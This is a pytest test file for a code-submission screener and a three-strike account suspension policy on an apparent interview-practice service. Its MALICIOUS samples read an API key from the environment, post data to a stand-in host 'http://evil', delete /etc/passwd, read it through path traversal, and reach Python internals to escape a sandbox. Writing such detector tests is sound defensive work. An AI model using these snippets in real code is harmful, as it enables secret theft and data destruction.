# Static screening + the three-strike policy.
import pytest

from app.core.config import settings
from app.services.code_screener import screen
from app.services.strikes import AccountSuspendedError, assert_active
from app.db.models import User


# ---------------- screener ----------------

MALICIOUS = {
    "socket": "import socket\ndef f(a,b):\n    socket.socket()",
    "subprocess": "import subprocess\ndef f(a,b):\n    subprocess.run(['ls'])",
    "env read": "import os\ndef f(a,b):\n    return os.environ['OPENAI_API_KEY']",
    "js env": "function f(a,b){ return process.env.OPENAI_API_KEY; }",
    "http": "import requests\ndef f(a,b):\n    requests.post('http://evil', data=a)",
    "js fetch": "function f(a,b){ fetch('http://evil', {method:'POST'}); }",
    "file write": "def f(a,b):\n    open('/tmp/x','w').write('x')",
    "file delete": "import os\ndef f(a,b):\n    os.remove('/etc/passwd')",
    "introspection": "def f(a,b):\n    return ().__class__.__bases__[0].__subclasses__()",
    "ctypes": "import ctypes\ndef f(a,b):\n    return 1",
    "dynamic import": "def f(a,b):\n    return __import__('os')",
    "path traversal": "def f(a,b):\n    return open('../../etc/passwd').read()",
    "pickle": "import pickle\ndef f(a,b):\n    return pickle.loads(a)",
}

BENIGN = {
    "two sum": "def two_sum(nums, target):\n    seen={}\n    for i,x in enumerate(nums):\n        if target-x in seen: return [seen[target-x],i]\n        seen[x]=i\n    return []",
    "dp": "def climb(n):\n    a=b=1\n    for _ in range(n-1):\n        a,b=b,a+b\n    return b",
    "js": "function maxProfit(p){let b=0,l=Infinity;for(const x of p){l=Math.min(l,x);b=Math.max(b,x-l);}return b;}",
    "sorting": "def solve(nums):\n    nums.sort()\n    return nums",
    "uses open as variable name": "def solve(open_count):\n    return open_count + 1",
    "recursion": "def fib(n):\n    return n if n<2 else fib(n-1)+fib(n-2)",
}


@pytest.mark.parametrize("label,code", list(MALICIOUS.items()))
def test_malicious_patterns_blocked(label, code):
    result = screen(code)
    assert result.verdict == "block", f"{label} was not blocked"
    assert result.reasons


@pytest.mark.parametrize("label,code", list(BENIGN.items()))
def test_benign_solutions_allowed(label, code):
    result = screen(code)
    assert result.allowed, f"{label} wrongly flagged: {result.reasons}"


def test_oversized_submission_blocked():
    assert screen("x = 1\n" * 10_000).verdict == "block"


def test_warn_does_not_count_as_strike():
    # An accidental infinite loop is a beginner mistake, not an attack
    result = screen("def f(a,b):\n    while True:\n        pass")
    assert result.verdict == "warn"
    assert result.is_violation is False


def test_block_counts_as_strike():
    assert screen("import socket").is_violation is True


# ---------------- strike policy ----------------

def test_assert_active_allows_active_user():
    assert_active(User(email="a@b.c", hashed_password="x", status="active"))


def test_assert_active_rejects_suspended():
    with pytest.raises(AccountSuspendedError):
        assert_active(User(email="a@b.c", hashed_password="x", status="suspended"))


async def _register(client, email):
    r = await client.post("/auth/register", json={"email": email, "password": "password123"})
    return r.json()


async def test_three_strikes_suspends_without_refund(client, monkeypatch):
    monkeypatch.setattr(settings, "max_strikes", 3)
    body = await _register(client, "striker@x.com")
    h = {"Authorization": f"Bearer {body['access_token']}"}
    start_balance = body["user"]["peppercorns"]

    payload = {
        "problem_id": "two-sum",
        "user_code": "import socket\ndef two_sum(a,b):\n    socket.socket()",
        "language": "python",
    }

    for expected_strike in (1, 2):
        r = await client.post("/analyze/", headers=h, json=payload)
        assert r.status_code == 400
        me = await client.get("/auth/me", headers=h)
        assert me.json()["strikes"] == expected_strike
        assert me.json()["status"] == "active"
        # blocked before the debit, so nothing was charged
        assert me.json()["peppercorns"] == start_balance

    # third strike suspends
    r = await client.post("/analyze/", headers=h, json=payload)
    assert r.status_code == 403
    me = await client.get("/auth/me", headers=h)
    assert me.json()["status"] == "suspended"
    assert me.json()["strikes"] == 3
    # peppercorns are NOT returned on suspension
    assert me.json()["peppercorns"] == start_balance


async def test_suspended_account_cannot_submit(client, monkeypatch):
    monkeypatch.setattr(settings, "max_strikes", 1)
    body = await _register(client, "susp@x.com")
    h = {"Authorization": f"Bearer {body['access_token']}"}
    bad = {"problem_id": "two-sum", "user_code": "import socket", "language": "python"}
    await client.post("/analyze/", headers=h, json=bad)

    # even a clean submission is refused once suspended
    clean = {
        "problem_id": "two-sum",
        "user_code": "def two_sum(nums, target):\n    return []",
        "language": "python",
    }
    r = await client.post("/analyze/", headers=h, json=clean)
    assert r.status_code == 403


async def test_benign_submission_never_strikes(client, monkeypatch):
    async def fake(**kwargs):
        from app.models.schemas import AnalysisResult
        return AnalysisResult(mistakes=[], enhancements=[], watchouts=[],
                              interview_tips=[], overall_feedback="ok")

    monkeypatch.setattr("app.routers.analyze.analyze_solution", fake)
    body = await _register(client, "good@x.com")
    h = {"Authorization": f"Bearer {body['access_token']}"}
    r = await client.post("/analyze/", headers=h, json={
        "problem_id": "two-sum",
        "user_code": "def two_sum(nums, target):\n    return [0, 1]",
        "language": "python",
    })
    assert r.status_code == 200
    me = await client.get("/auth/me", headers=h)
    assert me.json()["strikes"] == 0


async def test_admin_can_reinstate(client, monkeypatch):
    monkeypatch.setattr(settings, "max_strikes", 1)
    monkeypatch.setattr(settings, "admin_emails", "boss9@x.com")
    admin = await _register(client, "boss9@x.com")
    bad_user = await _register(client, "reinst@x.com")
    uh = {"Authorization": f"Bearer {bad_user['access_token']}"}
    await client.post("/analyze/", headers=uh, json={
        "problem_id": "two-sum", "user_code": "import socket", "language": "python"})

    ah = {"Authorization": f"Bearer {admin['access_token']}"}
    events = await client.get("/admin/security-events", headers=ah)
    assert events.status_code == 200
    assert len(events.json()) >= 1

    r = await client.post(
        f"/admin/users/{bad_user['user']['id']}/reinstate", headers=ah
    )
    assert r.status_code == 200
    assert r.json()["status"] == "active"
    assert r.json()["strikes"] == 0
